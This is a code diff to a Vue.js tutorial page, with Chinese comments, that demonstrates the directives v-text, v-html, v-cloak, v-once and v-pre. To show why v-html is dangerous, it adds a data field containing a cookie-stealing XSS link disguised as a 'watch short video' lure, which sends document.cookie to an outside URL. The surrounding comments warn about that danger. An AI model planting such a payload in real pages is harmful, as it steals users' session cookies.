@@ -6,14 +6,35 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>内置指令</title>
   <script src="../js/vue.js"></script>
+  <style>
+    [v-cloak] {
+      display: none;
+    }
+  </style>
 </head>
 <body>
   <div id="app">
     <h2>插值语法：{{name}}</h2>
     <h2 v-text="'v-text：' + name"></h2>
     <div v-html="html"></div>
+    <div v-html="htmlWarn"></div>
+    <h2 v-cloak>v-cloak：{{name}}</h2>
+    <h2>v-once的使用</h2>
+    <p v-once>初始值：{{num}}</p>
+    <p>当前值：{{num}}</p>
+    <button @click="num++">+</button>
+    <h2 v-pre>v-per：{{name}}</h2>
   </div>
   <script>
+    new Vue({
+      el: '#app',
+      data: {
+        name: '9ml',
+        html: '<h2>v-html：9ml</h2>',
+        htmlWarn: '<a href=javascript:location.href="https://www.baidu.com?" + document.cookie>点击观看小视频</a>',
+        num: 1
+      }
+    })
     /**
      * v-bind  ：单向绑定解析表达式，可简写为 :xxx
      * v-model ：双向数据绑定
@@ -23,15 +44,16 @@
      * v-else  ：条件渲染，动态控制节点是否存在
      * v-show  ：条件渲染，动态控制节点是否展示
      * v-text  ：向其所在的标签插入文本，会替换节点中的内容，类似与 innerText
-     * v-html  ：支持 HTML 结构的解析
-    */
-    new Vue({
-      el: '#app',
-      data: {
-        name: '9ml',
-        html: '<h2>v-html：9ml</h2>'
-      }
-    })
+     * v-html  ：向指定节点中渲染包含 HTML 结构的内容，会替换掉节点中的内容，可以识别 html 结构
+     *     注意：在网站上动态渲染任何 HTML 结构是非常危险的，容易导致 XSS(冒充用户) 攻击
+     *     一定要在可信的网站上使用，永远不要用在用户提交上
+     * v-cloak ：本质上是一个特殊属性，Vue 实例创建完毕并接管容器后会删除 v-cloak 属性
+     *     使用 css 配合 v-cloak 可以解决网速过慢时页面展示出未经解析的模板代码的问题
+     * v-once  ：v-once 所在的节点在初次动态渲染后，就视为静态内容了，以后数据的改变不会引起 v-once 所在结构的更新，可以用于优化性能
+     * v-pre   ：跳过所在节点的编译过程，可利用它跳过没有使用指令语法、没有使用插值语法的节点，会加快编译
+     * 
+     * 
+     */
   </script>
 </body>
 </html>
